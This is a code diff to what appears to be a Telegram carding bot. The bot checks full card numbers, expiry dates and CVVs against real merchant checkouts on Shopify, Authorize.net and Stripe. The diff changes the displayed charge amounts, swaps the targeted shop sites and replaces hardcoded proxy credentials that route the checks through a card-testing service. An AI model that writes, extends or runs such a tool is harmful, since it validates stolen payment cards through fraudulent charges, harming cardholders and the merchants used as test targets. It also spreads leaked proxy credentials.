@@ -667,7 +667,7 @@ async def charge_sub_menu_handler(update: Update, context: ContextTypes.DEFAULT_
             InlineKeyboardButton("💵 Shopify 10$", callback_data="shopify10_gate")
         ],
         [
-            InlineKeyboardButton("🏦 Authnet 36$", callback_data="authnet36_gate")
+            InlineKeyboardButton("🏦 Authnet 17$", callback_data="authnet36_gate")
         ],
         [InlineKeyboardButton("◀️ Back to Gate Menu", callback_data="gates_menu")]
     ])
@@ -805,9 +805,9 @@ async def authnet36_gate_handler(update: Update, context: ContextTypes.DEFAULT_T
     await q.answer()
     text = (
         "✦━━━━━━━━━━━━━━✦\n"
-        "      🏦 <b>Authnet 36$</b>\n"
+        "      🏦 <b>Authnet 17$</b>\n"
         "✦━━━━━━━━━━━━━━✦\n\n"
-        "• <code>/at</code> - <i>Check a single card on Authnet $36</i>\n"
+        "• <code>/at</code> - <i>Check a single card on Authnet $17</i>\n"
         "  Example:\n"
         "  <code>/at 1234567890123456|12|2026|123</code>\n\n"
         "⚡ Use carefully, each check deducts credits.\n\n"
@@ -1946,7 +1946,7 @@ async def st_worker(update: Update, card: str, status_msg):
     result_text = (
         f"<b>◇━━〔 {status_fmt} 〕━━◇</b>\n"
         f"{bullet_link} 𝐂𝐚𝐫𝐝 ➵ <code>{card_fmt}</code>\n"
-        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝗦𝘁𝗿𝗶𝗽𝗲 \n"
+        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝗦𝘁𝗿𝗶𝗽𝗲 1$\n"
         f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i>{response_fmt}</i>\n"
         "――――――――――――――――\n"
         f"{bullet_link} 𝐁𝐫𝐚𝐧𝐝 ➵ <code>{brand_fmt}</code>\n"
@@ -2690,7 +2690,7 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
             f"https://auto-shopify-6cz4.onrender.com/index.php"
             f"?site=https://deansafe.com"
             f"&cc={full_card}"
-            f"&proxy=qhlpirsk-247:96zjmb7awmom@p.webshare.io:80"
+            f"&proxy=qhlpirsk-238:96zjmb7awmom@p.webshare.io:80"
         )
 
         async with aiohttp.ClientSession() as session:
@@ -2747,7 +2747,7 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
 
         # --- Final formatted message ---
         final_msg = (
-            f"◇━━〔 <b>𝑺𝒉𝒐𝒑𝒊𝒇𝒚</b> 〕━━◇\n"
+            f"◇━━〔 <b>SHOPIFY</b> 〕━━◇\n"
             f"{bullet_link} 𝐂𝐚𝐫𝐝 ➵ <code>{full_card}</code>\n"
             f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝑺𝒉𝒐𝒑𝒊𝒇𝒚 𝟎.𝟗𝟖$\n"
             f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i>{display_response}</i>\n"
@@ -2921,7 +2921,7 @@ async def process_hc(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
             f"https://auto-shopify-6cz4.onrender.com/index.php"
             f"?site=https://shop.outsideonline.com"
             f"&cc={full_card}"
-            f"&proxy=qhlpirsk-241:96zjmb7awmom@p.webshare.io:80"
+            f"&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
         )
 
         async with aiohttp.ClientSession() as session:
@@ -3147,9 +3147,9 @@ async def process_at(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
         # --- API request ---
         api_url = (
             f"https://auto-shopify-6cz4.onrender.com/index.php"
-            f"?site=https://trimleaf.ca"
+            f"?site=https://roadshowcards.com"
             f"&cc={full_card}"
-            f"&proxy=qhlpirsk-239:96zjmb7awmom@p.webshare.io:80"
+            f"&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
         )
 
         async with aiohttp.ClientSession() as session:
@@ -3207,7 +3207,7 @@ async def process_at(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
         final_msg = (
             f"◇━━〔 <b>𝑨𝒖𝒕𝒉𝑵𝒆𝒕</b> 〕━━◇\n"
             f"{bullet_link} 𝐂𝐚𝐫𝐝 ➵ <code>{full_card}</code>\n"
-            f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝑨𝒖𝒕𝒉𝑵𝒆𝒕 𝟑𝟔$\n"
+            f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝑨𝒖𝒕𝒉𝑵𝒆𝒕 𝟏𝟕$\n"
             f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i>{display_response}</i>\n"
             "――――――――――――――――\n"
             f"{bullet_link} 𝐁𝐫𝐚𝐧𝐝 ➵ <code>{escape(brand)}</code>\n"
